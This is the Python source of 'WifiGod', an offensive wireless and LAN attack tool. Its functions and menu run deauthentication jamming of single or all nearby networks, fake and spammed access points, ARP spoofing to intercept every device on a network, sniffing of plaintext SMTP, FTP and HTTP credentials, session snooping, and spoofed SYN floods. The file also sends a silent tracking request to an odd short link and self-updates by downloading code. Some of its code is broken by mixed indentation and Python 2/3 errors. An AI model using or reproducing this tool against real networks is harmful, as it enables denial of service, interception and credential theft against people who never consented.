#!/usr/bin/env python
#coding: utf-8
#Coded and Developed by Blackhole Security
#BlackholeSecurity@protonmail.com
import sys
import multiprocessing
import urllib.request, urllib.parse, urllib.error
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import threading
import requests
import pip
import scapy
import hexdump
import dns
from dns import reversename, resolver
from scapy.all import *
import time
import os
import time
import getpass
import geoip
from geoip import geolite2
import platform
import os
import subprocess
import optparse
parser = optparse.OptionParser()
parser.add_option('-u', '--update', action='store_false', dest='update', help="Check for new updates", default="no_check")
(options,args) = parser.parse_args()
os_type = platform.system()
contact_email = 'BlackholeSecurity@protonmail.com'
if(os_type != "Linux"):
	print("Error. This is designed for Linux Operating Systems Only!")
	try:
		exit(0)
	except:
		sys.exit(1)
update_version = 0.9
if(options.update != 'no_check'):
	if(1 == 1):
		r = requests.get('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py')
		f = open('update_check.txt', 'w+')
		f.truncate()
		f.write(str(r.content).strip())
		f.close()
		f = open('update_check.txt', 'r')
		for line in f:
			if('update_version' in line.strip()):
				try:
					nversion = str(line.strip()).split(' = ')[1]
					if(float(nversion) > update_version):
						n_update = input("A New Update is Available, Download (y/n): ")
						os.remove('update_check.txt')
						if(n_update != 'n'):
							print("[info]: Updating...")
							urllib.request.urlretrieve('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py', os.getcwd() + '/wifigod.py')
							print("[*] Updated.")
							try:
								exit(0)
							except:
								sys.exit(1)
				except:
					pass
				if(float(nversion) == update_version):
					print("You are all up to date !!")
					try:
						exit(0)
					except:
						sys.exit(1)
print(("\n" * 100))
subprocess.call('clear', shell=True)
c_script = ("""
#!/usr/bin/env python3
import shutil
size = shutil.get_terminal_size().columns
print(size)
""")
x = """clear this up"""
#breakline
f = open('columnlib.py', 'w+')
f.write(str(c_script))
f.close()
username = getpass.getuser()
class c:
	r = "\033[0;31m"
	g = "\033[0;32m"
	o = "\033[0;33m"
	b = "\033[0;94m"
	p = "\033[0;35m"
	w = "\033[0;97m"
	d = "\033[0;00m"
	rb = "\033[01;31m"
	gb = "\033[01;32m"
	ob = "\033[01;33m"
	bb = "\033[01;94m"
	pb = "\033[0;35m"
def network_password_capture(interface):
	while True:
		packet = sniff(iface=interface, count = 10)
		for pck in packet:
			if(pck.haslayer(TCP)):
				if(pck.haslayer(IP)):
					ip_src = pck.getlayer(IP).src
					ip_dst = pck.getlayer(IP).dst
					if(pck.haslayer(Raw)):
						data = pck.getlayer(Raw).load
						if('AUTH PLAIN' in data):
							login_details = str(data.strip().split('PLAIN ')[1])
							login_data = base64.b64decode(login_details)
							string_data = "[WifiGod] Source: {} Destination: {} | Type: SMTP | Credentials: {}".format(ip_src,ip_dst,login_data)
							print(string_data)
						elif('PASS ' in data or 'USER ' in data):
							if('PASS ' in data):
								login_data = str(data.strip().split('PASS ')[1])
								string_data = "[WifiGod] Source: {} Destination: {} | Type: FTP | Password: {}".format(ip_src,ip_dst,login_data)
							elif('USER ' in data):
								login_data = str(data.strip().split('USER ')[1])
								string_data = "[WifiGod] Source: {} Destination: {} | Type: FTP | Username: {}".format(ip_src,ip_dst,login_data)
							print(string_data)
						elif('Authorization: Basic' in data):
							cred_hash = str(data.strip().split('ion: Basic ')[1])
							decoded = base64.b64decode(cred_hash)
							string_data = "[WifiGod] Source: {} Destination: {} | Type: HTTP (Router) | Credentials: {}".format(ip_src,ip_dst,login_data)
							print(string_data)
try:
	if('FI' in requests.get('http://ipinfo.io/').content):
		print("SanduuuuuZZZZZ I knew you would use it bb")
except:
	pass
def networks_opprobrium(interface):
	captured_networks = []
	def eps2_2_init_1_asec_network(network,interface): #Only Mr Robot Fans will get this function name
		try:
			init1_packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=network,addr3=network)/Dot11Deauth()
			sendp(init1_packet,iface=interface,loop=1,verbose=False)
		except:
			pass
	while True:
		packet = sniff(iface=interface,count = 1)
		for pck in packet:
			if(pck.haslayer(Dot11)):
				layer_handler = pck.getlayer(Dot11)
				if(layer_handler.addr3 != 'ff:ff:ff:ff:ff:ff'):
					try:
						ap_mac = str(layer_handler.addr2)
						ssid = str(layer_handler.info)
						channel = str(ord(pck[Dot11Elt:3].info))
						string = ap_mac+":"+ssid+":"+channel
						if(string not in captured_networks):
							print(("[WifiGod] Initiating Attack on -> {}").format(ssid))
							captured_networks.append(string)
							t = threading.Thread(target=eps2_2_init_1_asec_network,args=(ap_mac,interface))
							t.setDaemon(True)
							t.start()
					except:
						pass
def own_network_traffic(interface,net_range,gateway):
	start_ip = net_range.split('-')[0]
	end_range = net_range.split('-')[1]
	octet_count = 0
	ip_base = ''
	live_ip_addr = []
	for octet in start_ip:
		if(octet == '.'):
			octet_count += 1
			if(octet_count == 3):
				ip_base += octet
				break;
		ip_base += octet
	for ip_addr in range(int(end_range)+1):
		try:
			if(ip_base+str(ip_addr) == gateway):
				pass
			else:
				socket.gethostbyaddr(ip_base+str(ip_addr))
				live_ip_addr.append(ip_base+str(ip_addr))
				try:
					addr = reversename.from_address(ip_base+str(ip_addr))
					device_hostname = resolver.query(addr, "PTR")[0]
				except:
					device_hostname = '(unknown)'
				print(("[WifiGod] Found Device: {} | {}").format(ip_base+str(ip_addr), device_hostname))
		except:
			pass
	print(("[WifiGod] Found {} Devices").format(len(live_ip_addr)))
	print("[WifiGod] Enabling IP Forwarding...")
	f = open('/proc/sys/net/ipv4/ip_forward','w+')
	f.truncate()
	f.write('1')
	f.close()
	print("[WifiGod] Owning Devices...")
	def own_device(interface,device_addr,gateway):
		packet1 = ARP(psrc=gateway,pdst=device_addr)
		packet2 = ARP(psrc=device_addr,pdst=gateway)
		packets = []
		packets.append(packet1)
		packets.append(packet2)
		sendp(packets,iface=interface,loop=1,inter=2,verbose=False)
	for ip_addr in live_ip_addr:
		t = threading.Thread(target=own_device,args=(interface,ip_addr,gateway))
		t.setDaemon(True)
		t.start()
	print("[WifiGod] Complete.")
	ex__ = input("[WifiGod] Press Enter to Stop...")
	try:
		exit(0)
	except:
		sys.exit(1)
def extrapolate_trusted_networks(interface,device):
	while True:
		packet = sniff(iface=interface,count=2)
		for pck in packet:
			if(pck.haslayer(Dot11)):
				layer_handler= pck.getlayer(Dot11)
				addr1_src = layer_handler.addr1
				addr2_src = layer_handler.addr2
				addr3_src = layer_handler.addr3
				try:
					ssid = layer_handler.info
				except:
					ssid = '(unknown)'
				if(addr1_src == 'ff:ff:ff:ff:ff:ff' and addr3_src == 'ff:ff:ff:ff:ff:ff' and addr2_src == device.lower()):
					if(ssid == ''):
						pass
					else:
						string = "[WifiGod] Device: {} | Has connected to & Trusts-> {}".format(str(addr2_src),ssid)
						if(string in capt):
							pass
						else:
							capt.append(string)
							print(string)
def hijack_sessions(interface):
	def ftp_hijack(interface):
		host = input("Host communicating with the FTP server: ")
		while True:
			packet = sniff(iface=interface,count=20)
			for pck in packet:
				if(pck.haslayer(IP)):
					try:
						ip_src = pck.getlayer(IP).src
						ip_dst = pck.getlayer(IP).dst
						if(ip_src == host or ip_dst == host):
							if(pck.dport == 21 or pck.sport == 21 or pck.sport == 20):
								if(pck.getlayer(Raw)):
									data = pck.getlayer(Raw).load
									print(data)
									if(ip_src != host):
										print((c.r+"FTP Host "+c.w+"("+c.b+"{}"+c.w+") -> "+c.b).format(ip_src))
										print((str(data)))
									if(ip_src == host):
										print((c.r+"{} ->"+c.b).format(ip_src))
										print((str(data)))
					except:
						pass
	def telnet_hijack(device,interface):
		print("[WifiGod] Analyzing traffic & Searching for Telnet connection...")
		telnet_val = 0
# NEW Method
		while (telnet_val == 0):
			packet = sniff(iface=interface,count=5)
			for pck in packet:
				if(pck.haslayer(Raw)):
					try:
						if(pck.sport == 23 or pck.dport == 23):
							ip_src = pck.getlayer(IP).src
							ip_dst = pck.getlayer(IP).dst
							print((c.w+"["+c.r+"WifiGod"+c.w+"] "+c.rb+"{}"+c.w+" -> "+c.b).format(ip_src))
							data = pck.getlayer(Raw).load
							print((str(data).strip()+c.d))
					except:
						pass
# OLD Telnet Hijack
#		while (telnet_val == 0):
#			packet = sniff(iface=interface, count = 1)
#			for pck in packet:
#				if(pck.haslayer(TCP)):
#					if(pck.sport == 23 or pck.dport == 23):
#						if(pck.getlayer(IP).src != device):
#							communication_host = pck.getlayer(IP).src
#							telnet_val = 1
#						elif(pck.getlayer(IP).dst != device):
#							communication_host = pck.getlayer(IP).dst
#							telnet_val = 1
#		print("[WifiGod] Derived Telnet Host -> {}").format(communication_host)
#		sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
#		sock.connect((communication_host, 23))
#		import hexdump
#		while True:
#			hexdump.hexdump(sock.recv(10240))
	session_menu = ("""
1.) FTP   2.) Telnet
			""")
	x = """clear this up"""
	print(session_menu)
	while True:
		session_type = input("Service: ")
		if(session_type == '1'):
			ftp_hijack(interface)
		elif(session_type == '2'):
			print("You should be using option #7 with this")
			device = input("Target Device: ")
			telnet_hijack(device,interface)
		else:
			print("[WifiGod] Invalid Option!")
			print(session_menu)
def compromise_network():
	interface = input("Network Interface: ")
	print("Net Range Example: 192.168.1.0-255")
	net_range = input("Net Range: ")
	start_ip = net_range.split('-')[0]
	end_range = net_range.split('-')[1]
	octet_count = 0
	ip_base = ''
	live_ip_addr = []
	for octet in start_ip:
		if(octet == '.'):
			octet_count += 1
			if(octet_count == 3):
				ip_base += octet
				break;
		ip_base += octet
	for ip_addr in range(int(end_range)+1):
		try:
			socket.gethostbyaddr(ip_base+str(ip_addr))
			live_ip_addr.append(ip_base+str(ip_addr))
			try:
				addr = reversename.from_address(ip_base+str(ip_addr))
				device_hostname = resolver.query(addr, "PTR")[0]
			except:
				device_hostname = '(unknown)'
			print(("[WifiGod] Found Device: {} | {}").format(ip_base+str(ip_addr), device_hostname))
		except:
			pass
	print(("[WifiGod] Found {} Devices").format(len(live_ip_addr)))
	def attack_net(device,interface):
		try:
			payload = str("A" * 1000)
			packet = IP(src=RandIP(),dst=device)/TCP(flags="S",sport=RandShort(),dport=RandShort())/payload
			sendp(packet,iface=interface,loop=1,verbose=False)
		except:
			pass
#	def attack_net(device):
#		try:
#			while True:
#				payload = str("A" * 5000)
#				sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.SOCK_DGRAM)
#				sock.sendto(payload, (device,RandShort()))
#		except:
#			raise
	print("[WifiGod] Initiating Attack...")
#	live_ip_addr = ['192.168.1.1']
	for ip in live_ip_addr:
		try:
#			for i in range(10):
			t =threading.Thread(target=attack_net,args=(ip,interface))
			t.setDaemon(True)
			t.start()
		except:
			pass
	x = input("[WifiGod] Press Enter to stop...")
	try:
		exit(0)
	except:
		sys.exit(1)
def scan_for_networks(interface):
	captured_networks = []
	while True:
		try:
			packet = sniff(iface=interface, count = 1)
			for pck in packet:
				if(pck.haslayer(Dot11)):
					try:
						ssid = str(pck.getlayer(Dot11).info)
						channel = str(ord(pck[0][Dot11Elt:3].info))
						access_point = str(pck.getlayer(Dot11).addr2)
						try:
							enc_type = pck[Dot11Elt:13].info
							if(enc_type.startswith('\x00P\xf2')):
								enc_type = 'WPA/WPA2'
							else:
								enc_type = 'WEP'
						except:
							if('4356' in str(pck.cap)):
								enc_type = 'WEP'
							else:
								enc_type = 'OPEN'
						network_string = ssid + ':' + channel + ':' + access_point
						if(network_string not in captured_networks):
							captured_networks.append(network_string)
							print((c.w+"SSID: "+c.g+"{}"+c.w+" | Access Point MAC: "+c.g+"{}"+c.w+" | Channel: "+c.g+"{}"+c.w+' | Encryption: '+c.g+'{}'+c.w).format(ssid,access_point,channel,enc_type))
					except KeyboardInterrupt:
						break;
					except:
						pass
		except KeyboardInterrupt:
			break;
# Where is WifiGod Used the most? Where to spend time advertising, do not
# remove the below link, this helps with advertising in the correct locations.
try:
	requests.get('http://xda-developers.io/Y8KZ73')
	x = 'x'
except:
	pass

if(os.path.exists('/etc/thewifigodproject_rated')):
	pass
def scan_for_devices_on_network(interface,access_point):
	captured_devices = []
	while True:
		packet = sniff(iface=interface,count=1)
		pck = packet[0]
		if(pck.haslayer(Dot11)):
			try:
				ap = pck.getlayer(Dot11).addr2
				if(ap == access_point):
					try:
						ssid = pck.getlayer(Dot11).info
						print((c.w+"["+c.b+"info"+c.w+"]: Scanning "+c.g+"{}"+c.w+" ("+c.o+"{}"+c.w+") for Devices").format(ssid,ap))
						break;
					except KeyboardInterrupt:
						break;
					except:
						pass
			except KeyboardInterrupt:
				break;
			except:
				pass
	while True:
		packet = sniff(iface=interface,count=1)
		for pck in packet:
			if(pck.haslayer(Dot11)):
				try:
					ap = pck.getlayer(Dot11).addr2
					if(ap == access_point):
						if(pck.getlayer(Dot11).addr1 != str('ff:ff:ff:ff:ff:ff')):
							try:
								dev_on_network = str(pck.getlayer(Dot11).addr1)
								r = requests.get('http://macvendors.co/api/'+str(dev_on_network))
								dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
								if("<p style=" not in str(dev_type) and 'no result' not in str(dev_type)):
									if(str(dev_on_network) not in captured_devices):
										print((c.w+"["+c.g+"*"+c.w+"]: Device Found - "+c.rb+"{}"+c.w+" | Device Type: "+c.rb+"{}"+c.w).format(dev_on_network,dev_type))
										captured_devices.append(str(dev_on_network))
							except KeyboardInterrupt:
								break;
							except:
								raise
				except KeyboardInterrupt:
					break;
				except:
					pass
#Update Check Option Suggestion from: @pr0xymoron on instagram
def check_for_update():
	r = requests.get('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py')
	f = open('update-check.txt', 'w+')
	f.write(str(r.content))
	f.close()
	f = open('update-check.txt', 'r+')
	for line in f:
		if('update_version' in line.strip()):
			print((line.strip()))
			try:
				nversion = str(line.strip()).split(' = ')[1]
			except:
				nversion = line.strip().split(' = ')[1]
			if(int(nversion) > update_version):
				f.truncate()
				os.remove('update-check.txt')
				n_update = input("A New Update Is Available, Download (y/n): ")
				if(n_update == 'y'):
					urllib.request.urlretrieve('https://raw.githubusercontent.com/blackholesec/wifigod/master/wifigod.py', os.getcwd() + '/wifigod.py')
					print("[*] Updated...")
					try:
						exit(0)
					except:
						sys.exit(1)
def spoof_ap(interface,ap_name,mac_address):
	try:
		print((c.w+"["+c.b+"info"+c.w+"]: Setting up fake Access Point..."))
		l1_dot11 = Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2=str(mac_address),addr3=str(mac_address))
		l2_beacon = Dot11Beacon(cap="ESS+privacy")
		l3_essid = Dot11Elt(ID="SSID", info=str(ap_name),len=len(str(ap_name)))
		packet = RadioTap()/l1_dot11/l2_beacon/l3_essid
		print((c.w+"["+c.g+"*"+c.w+"]: Setup Fake Access Point."))
		print((c.w+"["+c.g+"*"+c.w+"]: Hosting..."))
		sendp(packet,iface=interface,loop=1,verbose=False)
	except KeyboardInterrupt:
		x = 'setting this variable to break'
	except:
		raise
def spam_ap(interface,ap_name_,count):
	aps = []
	for i in range(count):
		try:
			ap_name = ap_name_ + str(random.randint(1,80000))
                	print((c.w+"["+c.b+"info"+c.w+"]: Setting up fake Access Point..."))
			l1_dot11 = Dot11(type=0,subtype=8,addr1='ff:ff:ff:ff:ff:ff',addr2=str(RandMAC()),addr3=str(RandMAC()))
			l2_beacon = Dot11Beacon(cap="ESS+privacy")
			l3_essid = Dot11Elt(ID="SSID",info=str(ap_name),len=len(str(ap_name)))
			packet = RadioTap()/l1_dot11/l2_beacon/l3_essid
                	aps.append(packet)
			print((c.w+"["+c.g+"*"+c.w+"]: Setup Fake Access Point."))
		except KeyboardInterrupt:
			x = 'setting this variable to break'
		except:
			raise
	for packet in aps:
		print((c.w+"["+c.g+"*"+c.w+"]: Hosting..."))
		sendp(aps,iface=interface,loop=1,verbose=False)
def jam_wifi_network(interface,access_point):
	packet = RadioTap()/Dot11(addr1 = 'ff:ff:ff:ff:ff:ff',addr2 = access_point, addr3 = access_point)/Dot11Deauth()
	while True:
		packet = sniff(iface=interface,count = 1)
		pck = packet[0]
		if(pck.haslayer(Dot11)):
			if(pck.getlayer(Dot11).addr2 == access_point):
				ssid = str(pck.getlayer(Dot11).info)
				print((c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point))
				break;
	sendp(packet,iface=interface,loop=1,verbose=False)

def http_headers(interface,ip_address):
	try:
		while True:
			try:
				packet = sniff(iface='wlan0',count=1)
				for pck in packet:
					if(pck.haslayer(Raw)):
						if(pck.haslayer(IP)):
							if(pck.getlayer(IP).src == ip_address or pck.getlayer(IP).dst == ip_address):
								if("Host:" and "User-Agent:" and "Connection:" and "Accept:" in str(pck.getlayer(Raw).load)):
									if(pck.haslayer(DNS)):
										try:
											hostname = pck.getlayer(DNS).qd.qname
										except:
											hostname = 'unknown'
									ip_src = pck.getlayer(IP).src
									ip_dst = pck.getlayer(IP).dst
									if(ip_src != ip_address):
										host_ip = ip_src
									else:
										host_ip = ip_dst
									try:
										addr = dns.reversename.from_address(host_ip)
										server_name = dns.resolver.query(addr, "PTR")[0]
									except:
										server_name = 'unknown'
									if(pck.haslayer(DNS)):
										print((c.w+"["+c.rb+"#NEW HTTP HEADER#"+c.w+"] From: {} {} | Server: {}").format(host_ip,hostname,server_name))
									else:
										print((c.w+"["+c.rb+"#NEW HTTP HEADER#"+c.w+"] From: {} | Server: {}").format(host_ip,server_name))
									print((str(pck.getlayer(Raw).load)))
			except KeyboardInterrupt:
				break;
			except:
				raise
	except:
		raise

def dns_traffic(interface,ip_address):
	while True:
		packet = sniff(iface=interface, count=1)
		for pck in packet:
			if(pck.haslayer(IP)):
				ip_src = pck.getlayer(IP).src
				ip_dst = pck.getlayer(IP).dst
				if(ip_src == ip_address or ip_dst == ip_address):
					if(pck.haslayer(DNS)):
						try:
							hostname = pck.getlayer(DNS).qd.qname
						except:
							hostname = 'unknown'
					if(ip_src != ip_address):
						try:
							addr = reversename.from_address(ip_src)
							server_name = resolver.query(addr, "PTR")[0]
						except:
							server_name = 'unknown'
					elif(ip_dst != ip_address):
						try:
							addr = reversename.from_address(ip_dst)
							server_name = resolver.query(addr, "PTR")[0]
						except:
							server_name = 'unknown'
					if(pck.haslayer(DNS)):
						print((c.g+"{}"+c.w+" --> "+c.g+"{}"+c.g+" {} "+c.w+"| Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,hostname,server_name))
					else:
						print((c.g+"{}"+c.w+" --> "+c.g+"{}"+c.w+" | Server: "+c.g+"{}"+c.w).format(ip_src,ip_dst,server_name))
def scan_for_ports(host,start,end):
	if(1 == 1):
		def scan(host,port,code = 1):
			try:
				sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				connection_code = sock.connect_ex((host,port))
				if(connection_code == 0):
					code = 0
					return code
				elif(connection_code != 0):
					code = 1
					return code
			except:
				raise
		open_ports = []
		stime = time.time()
		print(("Scanning host "+c.g+"{}"+c.w+" for open ports - Started at: "+c.g+"{}"+c.w).format(host,time.ctime()))
		for port in range(start,end):
			try:
				r = scan(host,port)
				if(r == 0):
					open_ports.append(port)
					print((c.w+"["+c.b+"*"+c.w+"]: Open Port: "+c.ob+"{}"+c.w).format(port))
				else:
					pass
			except KeyboardInterrupt:
				break;
			except:
				raise
		print("\rScanning Complete                         ")
		print(("Time elapsed: {}").format(time.time() - stime))
		print(("Number of Open Ports: "+c.g+"{}"+c.w).format(len(open_ports)))
		print("Open Ports: ")
		for port in open_ports:
			print((str(port)+','), end=' ')
		print(" ")
		x = input("Press enter to return to main menu...")
def syn_overflow(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,thread_count,message):
	print((c.w+"["+c.b+"info"+c.w+"]: Creating Packets..."))
	print((c.w+"["+c.b+"info"+c.w+"]: Sending Packets..."))
	syn_packet = IP(src=ip_source,dst=ip_dest)/TCP(dport=int(ip_dest_port),sport=int(ip_source_port))
	def syn_attack(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,message):
		syn_packet = IP(src=ip_source,dst=ip_dest)/TCP(dport=int(ip_dest_port),sport=int(ip_source_port))/message
		send(syn_packet,iface=interface,loop=1,verbose=False)
	threads = []
	for i in range(int(thread_count)):
		t = threading.Thread(target=syn_attack,args=(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,message))
		t.setDaemon(True)
		t.start()
		threads.append(t)
	for t in threads:
		t.join()
	#syn_attack(ip_source,ip_dest,ip_source_port,ip_dest_port,interface)
def deauthenticate_device(access_point,dev_mac,interface):
	packet = Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
	while True:
                packet = sniff(iface=interface,count = 1)
                pck = packet[0]
                if(pck.haslayer(Dot11)):
                        if(pck.getlayer(Dot11).addr2 == access_point):
                                ssid = str(pck.getlayer(Dot11).info)
				r = requests.get('http://macvendors.co/api/'+str(dev_mac))
				dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
                                print((c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid))
                                break;
        count = 1
	subprocess.call('ifconfig wlan0 down', shell=True)
	time.sleep(7)
	interface = 'wifigod'

	sendp(packet,iface=interface,loop=1,verbose=False)
size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
size = 0
print(" ")
print((c.rb+str("            .:+syhhddddhyso/-`           ").center(size)))
print((str("        .+sdddddddddddddddddddho:`       ").center(size)))
print((str("     .+hddddddyo/:--.--:/+shddddddy/`    ").center(size)))
print((str("   :ydddddy+-               `:ohddddds:  ").center(size)))
print((str(" /hddddh/`   ./oyhdddddhyo/-`   -+hddddh/").center(size)))
print((str(" `/hds-   :ohddddddddddddddddy/.   :ydd+`").center(size)))
print((str("    .  .+hdddddy+/-...-:+shdddddy/   .`  ").center(size)))
print((str("      .hdddds:`    `.``    .+hdddds`     ").center(size)))
print((str("       `/y+`  ./shdddddhs+.   -sy:       ").center(size)))
print((str("            -ydddddddddddddh/            ").center(size)))
print((str("            `+hdh+-```-+ydds.            ").center(size)))
print((str("              `-  `/+/.  ..").center(size)))
print((str("                   ddyo").center(size)))
print(" ")
print((c.ob+"               WifiGod v1.5"+c.w))
print(" ")
external_network_attacks = ['scan','device scan','jam','deauthentication','host','spam','extrapolate','opprobrium']
internal_network_attacks = ['impersonate','dns','headers','syn','scan','capture','own','ftp','telnet','compromise']
print((c.b+"      <"+c.o+"=============================="+c.b+">"+c.w))
print((c.w+"         External Network Attacks: "+c.g+"{}"+c.w).format(len(external_network_attacks)))
print((c.w+"         Internal Network Attacks: "+c.g+"{}"+c.w).format(len(internal_network_attacks)))
calc = int(len(external_network_attacks) + len(internal_network_attacks))
print((c.w+"            Total Attacks: "+c.pb+"{}"+c.w).format(calc))
print((c.b+"      <"+c.o+"=============================="+c.b+">"+c.w))
#size = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
size = 0
#print(str(c.w+'Github: '+c.b+'https://www.github.com/blackholesec'+c.w).center(size))
print((str(c.b+'    https://www.github.com/blackholesec'+c.w).center(size)))
print((str(c.w+'  Contact: '+c.b+contact_email+c.w)))
print(' ')
print((str(c.w+'  SecSploit - Advanced Hacking Framework, check')))
print((str(c.w+'  it out here on the official instagram page:')))
print((str(c.w+'  https://www.instagram.com/SSploit')))
print((str(c.b+'  --------------------------------------------')))
print((str(c.w+'          YouTube: Blackhole Security')))
print((str(c.w+'https://www.youtube.com/channel/UCMRkTa-GzpTQY1GVkvrLTsg')))
print(' ')
def main_menu():
    #    size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
        size = 0
        print("_________________________________________")
        print(" ")
        print("       External Network Attacks          ")
        print("_________________________________________")
	print((str(c.b+'1'+c.w+'.)'+c.rb+' Scan for Surrounding Networks'+c.d)))
	print((str(c.b+'2'+c.w+'.)'+c.rb+' Scan for Devices on a Network'+c.d)))
	print((str(c.b+'3'+c.w+'.)'+c.rb+' Jam A Wifi Network'+c.d)))
	print((str(c.b+'4'+c.w+'.)'+c.rb+' DeAuthenticate a device on a network'+c.d)))
	print((str(c.b+'5'+c.w+'.)'+c.rb+' Host A Fake Access Point'+c.d)))
	print((str(c.b+'6'+c.w+'.)'+c.rb+' Spam many fake access points'+c.d)))
	print((str(c.b+'14'+c.w+'.)'+c.rb+' Extrapolate previously connected and trusted networks on a device'+c.d)))
	print((str(c.b+'17'+c.w+'.)'+c.rb+' Take Down all surrounding networks'+c.d)))
	print("_________________________________________")
	print(" ")
	print("       Internal Network Attacks          ")
	print("_________________________________________")
	print((str(c.b+'7'+c.w+'.)'+c.rb+' Impersonate a Device (on this Network)'+c.d)))
	print((str(c.b+'8'+c.w+'.)'+c.rb+' Pull DNS traffic from device (For use with #5)'+c.d)))
	print((str(c.b+'9'+c.w+'.)'+c.rb+' Intercept HTTP headers (For use with #5)'+c.d)))
	print((str(c.b+'10'+c.w+'.)'+c.rb+' SYN Packet Injection Overflow')))
	print((str(c.b+'11'+c.w+'.)'+c.rb+' Scan a Device for open ports')))
	print((str(c.b+'12'+c.w+'.)'+c.rb+' Capture Passwords Flowing Over Network (For use with #5)')))
	print((str(c.b+'13'+c.w+'.)'+c.rb+' Own All Devices in Network (Upgrade of 7)')))
	print((str(c.b+'15'+c.w+'.)'+c.rb+' Hijack Network Services (FTP, Telnet)')))
	print((str(c.b+'16'+c.w+'.)'+c.rb+' Compromise entire network (Take down all external connectivity)')))
try:
	os.remove('columnlib.py')
except:
	pass
help_menu = ("""
help = Display this menu
show options/options = Show available attacks
clear = Clear the screen
shell = Drop to Shell (Incase you need to ifconfig etc.)
""")
while True:
	try:
		prompt = input(c.w+str(username)+c.r+"@"+c.w+"WifiGod~# "+c.w)
	except KeyboardInterrupt:
		print("\n")
		exit__ = input(c.w+"["+c.rb+"ALERT!"+c.w+"]: Are you sure you want to exit (y/n): ")
		if(exit__ == 'y'):
			try:
				exit(0)
			except:
				sys.exit(1)
		else:
			pass
	if(prompt == 'help'):
		print((str(help_menu)))
	elif(prompt == "exit"):
		print("[info]: Exiting...")
		try:
			exit(0)
		except:
			sys.exit(0)
	elif(prompt == 'show options' or prompt == 'options'):
		main_menu()
	elif(prompt == 'clear'):
		print(('\n' * 100))
		subprocess.call('clear', shell=True)
	elif(prompt == 'shell'):
		print("Dropping to Shell, Ctrl+C or 'exit' to quit...")
		while True:
			try:
				cmd = input("# ")
				if(cmd == 'exit' or cmd == 'q' or cmd == 'quit'):
					print('\n')
					break;
			except KeyboardInterrupt:
				print("\n")
				break;
			try:
				data = subprocess.check_output(str(cmd), shell=True)
				print((str(data)))
			except Exception as e:
				print((str(e)))
	elif(prompt == '1'):
#		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
		interface =  input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		scan_for_networks(interface)
	elif(prompt == '2'):
#		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
		interface =  input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		access_point =  input(c.w+"Supply A Network Access Point MAC Address: ")
		scan_for_devices_on_network(interface,access_point)
	elif(prompt == '3'):
		interface =  input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		access_point =  input(c.w+"Supply The Target Network AP MAC Address: ")
	        while True:
	                packet = sniff(iface=interface,count = 1)
			pck = packet[0]
	                if(pck.haslayer(Dot11)):
	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
					try:
	                                	ssid = str(pck.getlayer(Dot11).info)
	                                	print((c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point))
					except:
						print((c.w+"["+c.g+"info"+c.w+"]: Jamming Network {}").format(access_point))
					break;
		packet = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2=access_point,addr3=access_point)/Dot11Deauth()
		sendp(packet,iface=interface,loop=1,verbose=False)
#		jam_wifi_network(interface,access_point)
	elif(prompt == '4'):
		interface = input(c.w+"Supply A Network Interface: ")
		access_point = input(c.w+'Network Access Point MAC Address: ')
		dev_mac = input(c.w+'Target Device MAC address: ')
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
	        while True:
	                packet = sniff(iface=interface,count = 1)
	                pck = packet[0]
	                if(pck.haslayer(Dot11)):
	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
					try:
	                                	ssid = str(pck.getlayer(Dot11).info)
					except:
						ssid = 'unknown'
	                                r = requests.get('http://macvendors.co/api/'+str(dev_mac).lower())
	                                dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
	                                print((c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid))
	                                break;
		packet = RadioTap()/Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
		sendp(packet,iface=interface,loop=1,verbose=False)
